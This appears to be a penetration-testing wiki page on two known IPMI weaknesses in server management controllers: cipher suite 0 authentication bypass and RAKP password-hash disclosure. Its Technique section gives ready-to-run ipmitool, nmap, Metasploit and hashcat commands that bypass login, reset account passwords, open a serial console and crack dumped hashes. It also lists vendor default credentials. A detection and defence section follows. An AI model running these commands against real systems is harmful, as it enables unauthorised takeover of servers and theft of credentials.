---
title: IPMI Cipher 0 and RAKP Hash Dump
slug: ipmi-cipher-zero
---

> **TL;DR:** Baseboard Management Controllers exposing IPMI 2.0 on UDP 623 often accept "cipher suite 0", which skips authentication entirely, and even when patched they leak password hashes through the RAKP handshake.

## What it is
IPMI is the out-of-band management protocol shipped on practically every server-class motherboard (Dell iDRAC, HPE iLO, Supermicro IPMI, Lenovo XCC). Two structural flaws — cipher 0 authentication bypass and RAKP-mode HMAC hash disclosure — were documented by Dan Farmer in 2013 and are still found on management networks more than a decade later. Both target the BMC, an always-on auxiliary processor that has full hardware access to the host.

## Preconditions / where it applies
- UDP/623, IPMI 2.0 RMCP+ session setup
- Cipher 0 accepted (server-side misconfiguration on Supermicro / older Dell)
- RAKP HMAC leak affects the protocol itself, not a single vendor
- Found on mgmt VLANs, colo cross-connects, and accidentally on public IPs (Shodan: `port:623`)
- Default credentials: ADMIN/ADMIN (Supermicro), root/calvin (iDRAC), Administrator/random (iLO with sticker)

## Technique
```bash
# Discover BMCs
nmap -sU -p 623 --script ipmi-version 10.0.0.0/24

# Cipher 0 bypass — pick any username, no password works
ipmitool -I lanplus -C 0 -H 10.0.0.10 -U Administrator -P anything user list
ipmitool -I lanplus -C 0 -H 10.0.0.10 -U Administrator -P anything user set password 2 newpass
ipmitool -I lanplus -C 0 -H 10.0.0.10 -U Administrator -P anything sol activate

# RAKP HMAC hash dump (works even on patched cipher 0)
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; \
  set RHOSTS 10.0.0.10; set OUTPUT_HASHCAT_FILE /tmp/bmc.hashes; run; exit"
hashcat -m 7300 /tmp/bmc.hashes rockyou.txt

# Once you have root on the BMC, dump the host via KCS / virtual media
ipmitool -I lanplus -H 10.0.0.10 -U ADMIN -P ADMIN chassis power cycle
```

## Detection and defence
- IDS rule for RMCP+ open-session requests with `cipher_suite=0`
- Disable cipher 0 in BIOS / iDRAC racadm: `racadm set iDRAC.IPMILan.CipherSuite 3`
- Bind BMCs to an isolated management VLAN, never route to the office network
- Force complex passwords (RAKP hash is offline-crackable; long random passphrase mitigates)
- Vendor patches: Supermicro X9/X10 BIOS updates, iLO 4 firmware >= 2.30, iDRAC8 >= 2.40

## References
- [USENIX 2013 — Sold Down the River (Dan Farmer)](https://fish2.com/ipmi/) — original public disclosure of cipher 0 and RAKP
- [Rapid7 IPMI module docs](https://docs.rapid7.com/metasploit/) — auxiliary/scanner/ipmi usage

See also: [[exposed-services]], [[port-scanning]], [[snmp-enum]].
